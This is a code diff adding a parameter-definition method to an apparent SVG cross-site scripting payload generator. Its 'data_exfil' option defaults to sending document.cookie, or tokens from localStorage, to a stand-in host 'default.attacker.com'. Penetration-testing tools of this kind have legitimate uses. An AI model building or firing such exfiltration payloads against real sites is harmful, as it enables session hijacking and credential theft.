@@ -205,6 +205,46 @@ class SVGPayloadGenerator(PayloadGenerator):
 }})();
 //</script></svg>"""
 
+    def get_payload_params_definition(self, payload_name: str) -> list[dict]:
+        """Return parameter definitions for the given SVG payload type."""
+        definitions = []
+        if payload_name == 'basic':
+            pass # No parameters
+        elif payload_name in ['script_tag', 'event_handler', 'animate', 'foreign_object', 'polyglot']:
+            definitions.append({
+                'name': 'js_code',
+                'label': 'JavaScript Code',
+                'type': 'string', # Could be 'text' for larger input in UI
+                'default': "alert(document.domain + ' - SVG XSS');",
+                'description': 'The JavaScript code to embed or execute.',
+                'required': True
+            })
+        elif payload_name == 'data_exfil':
+            definitions.extend([
+                {
+                    'name': 'callback_url',
+                    'label': 'Callback URL',
+                    'type': 'string',
+                    'default': 'https://default.attacker.com/exfil_svg_callback',
+                    'description': 'The URL to send the exfiltrated data to.',
+                    'required': True
+                },
+                {
+                    'name': 'data_to_exfil_script',
+                    'label': 'Data Exfiltration JS (eval)',
+                    'type': 'string', # Could be 'text'
+                    'default': "(typeof document !== 'undefined' ? document.cookie : 'no_document_cookie')",
+                    'description': 'JavaScript expression (string) to evaluate for data to exfiltrate (e.g., document.cookie, localStorage.getItem("token")).',
+                    'required': True
+                }
+            ])
+        # else:
+            # Optionally raise ValueError for unknown payload_name if strict,
+            # but get_available_payloads should be the source of truth for valid names.
+            # logger.warning(f"Request for params of unknown SVG payload: {payload_name}")
+
+        return definitions
+
 if __name__ == '__main__':
     # Ensure the logger for __main__ (this script) is also configured to show DEBUG messages for testing
     main_logger = logging.getLogger(__name__)
